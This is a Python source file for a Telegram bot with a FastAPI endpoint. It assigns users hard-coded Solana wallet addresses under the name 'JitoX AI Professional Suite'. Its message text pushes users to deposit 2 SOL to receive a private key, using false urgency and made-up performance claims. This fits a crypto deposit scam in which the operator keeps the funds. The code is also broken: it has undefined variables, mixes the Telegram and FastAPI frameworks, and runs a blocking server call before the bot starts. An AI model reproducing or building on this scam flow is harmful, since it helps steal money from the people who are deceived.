from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes

# Initialize FastAPI app
api = FastAPI()

# Add CORS middleware
api.add_middleware(
    CORSMiddleware,
    allow_origins=["https://jitonexus.github.io"],  # Allow your dashboard domain
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

wallet_addresses = [
    "GRf2Ch3gLRxcPw4nCSFFLoWLxizEa4xW99HVuL2C8x3J",
    "5BLqkTRtQR54x1u36i8XnD1vE5PP2BhBnKpzKV9NcjMJ",
    "84LHkkzAzf2buuM3w8wiNHwdNCiwJu1JafV7J714eo8Z"
]

# API endpoint to get user's wallet
@api.get("/get_wallet")
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if update.callback_query:
        message_func = update.callback_query.edit_message_text
    else:
        message_func = update.message.reply_text

    if user_id not in user_wallets:
        if wallet_addresses:
            wallet = wallet_addresses.pop(0)
            user_wallets[user_id] = wallet
            await log_user_activity(context.application, user_id, f"was assigned wallet: {wallet}")
            message = (
                "👾 <b>Congratulations! Your JitoX AI Professional Suite Access is Confirmed</b> 👾\n\n"
                "⚔️ <b>Your Dedicated Trading Wallet:</b>\n\n"
                f"<code>{wallet}</code>\n\n"
                "🎯 <b>Private Key Notice:</b>\n"
                "Your private key will be automatically assigned after your first deposit of 2 SOL\n\n"
                "🎯 <b>Essential Setup Steps:</b>\n\n"
                "1. Initialize with 2 SOL to activate your trading suite\n"
                "2. Your deposit serves as your trading balance - fully withdrawable\n"
                "3. Private key access granted upon initialization\n\n"
                "🚀 <b>Limited Capacity Alert: Professional tier slots are filling rapidly</b>\n\n"
                "✨ <b>Performance Insight: Early adopters report 51% higher performance metrics</b>\n\n"
                "💎 <b>Activation Benefits:</b>\n\n"
                "⚡ Immediate suite activation post-deposit\n"
                "⚡ Priority access to next trading cycle\n"
                "⚡ Real-time performance tracking\n"
                "⚡ Full private key access\n\n"
                "🛡 <b>Professional Support: Contact @jitoxai for priority assistance</b>\n\n"
                "Professional traders understand: Optimal entry timing is crucial in MEV.\n\n"
                "Ready to elevate your trading? Complete your 2 SOL initialization now. 🎮"
            )
            
            # Check if this user was referred
            for referrer_id, referred_users in referrals.items():
                if user_id in referred_users:
                    referral_earnings[referrer_id] = referral_earnings.get(referrer_id, 0) + 0.1
                    await send_admin_notification(context.application, f"User {user_id} (referred by {referrer_id}) received a wallet")
                    break
        else:
            message = "Sorry, all have been filled, please contact @jitoxai for a spot."
    else:
        wallet = user_wallets[user_id]
        message = (
            "Your existing wallet address:\n"
            f"<code>{wallet}</code>\n\n"
            "🎯 <b>Private Key Notice:</b>\n"
            "Your private key will be automatically assigned after your first deposit of 2 SOL"
        )

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await message_func(message, reply_markup=reply_markup, parse_mode='HTML')

# Add this to your main() function
def main():
    # Your existing bot code...
    
    # Run FastAPI app with uvicorn
    import uvicorn
    uvicorn.run(api, host="0.0.0.0", port=8000)
    
    # Start the bot
    application.run_polling() 